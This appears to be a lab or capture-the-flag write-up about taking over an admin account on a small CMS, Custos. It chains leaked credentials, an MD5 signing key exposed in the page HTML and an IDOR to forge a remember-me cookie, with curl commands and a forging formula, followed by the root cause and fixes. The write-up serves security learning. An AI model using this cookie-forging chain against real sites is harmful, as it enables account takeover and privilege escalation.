# Custos Remember-Me MD5 Cookie Forge

## What Is Happening

[Custos](https://6160fe80ee28.pwnbox-lab.com/) is a small CMS. Leaked creds `john` / `password` work. The “Keep me logged-in” feature builds a remember-me cookie in JavaScript using MD5 and a key the server places in the login response HTML. That key is shared. Combined with an IDOR on `/api/get_info`, an attacker forges an admin remember-me cookie and restores an admin session without the admin password.

## Why It Happens

After login with remember-me, `/js/s.js` stores:

```text
k = signing key from hidden input
e = expiry
u = username
```

On the next page load, `/js/c.js` does:

```javascript
ui = decodeURIComponent(get_cookie('userid'))
data = ui + '|' + u + '|' + calcMD5(k + ui + u)
set_cookie('rc', btoa(data), e)
```

`userid` is base64 of the numeric user id (`2` → `Mg==`). The server later accepts `userid` + `username` + `rc` to recreate a session (e.g. via `/login`).

Because `k` is global and visible, the MAC is forgeable for any `(ui, username)` pair.

## Exact Test

1. Login:

```bash
curl -sS -c jar -X POST "https://[host]/login" \
  -d "username=john&password=password&remember=true"
```

2. Read key from hidden `name="1"` in the redirect HTML.

3. Enumerate users:

```bash
curl -sS -b jar -X POST "https://[host]/api/get_info" -d "user_id=47"
```

4. Forge cookies (placeholders):

```text
userid   = base64(admin_id)          # e.g. NDc= for 47
username = administrator_[digits]
rc       = btoa(userid + '|' + username + '|' + md5(key + userid + username))
```

5. Request `/login` with those cookies (no password) and open `/profile`.

## Expected Signal

- Low-privilege profile: “you are not administrator”.
- Forged admin session: administrator welcome + flag / admin scope.
- Invalid username/id pairs fall back to the login form.

## Result Interpretation

Confirmed chain:

```text
leaked low-priv creds
-> shared remember-me MD5 key in HTML
-> IDOR /api/get_info reveals admin username + id
-> forge rc cookie
-> /login restores admin session
```

## Root Cause

Client-constructed remember-me integrity using a disclosed, shared secret, plus missing authorization on user lookup.

## Impact

- Full account takeover for any known username/id pair.
- Privilege escalation to admin without password cracking.
- Bypass of “other accounts are safe” assumption after one leaked password.

## Fix

- Opaque server-issued remember tokens; store only hashes server-side.
- Never put MAC keys in client HTML/JS.
- Authorize `/api/get_info` (self-only or admin-only).
- Bind tokens to user id, device, and expiry; rotate on password change.

## Related Files

- `labs/2026-07-10-custos-remember-me-md5-cookie-forge.md`
- `notes/remember-me-client-md5-cookie-forge.md`
- `payloads/auth/remember-me-md5-rc-cookie-forge.md`
- `notes/client-side-role-trust-auth-bypass.md`
